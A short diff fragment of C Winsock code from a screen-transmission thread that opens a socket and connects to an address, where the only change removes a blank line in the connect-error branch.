@@ -35,7 +35,6 @@ DWORD __stdcall ScreenManageThread(LPVOID lparam)//线程处理屏幕传输
 	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);//重新建立一个专门的socket和客户端进行交互
 	if(connect(MainSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
-
 		closesocket(MainSocket);
 		return 0;//connect error
 	}
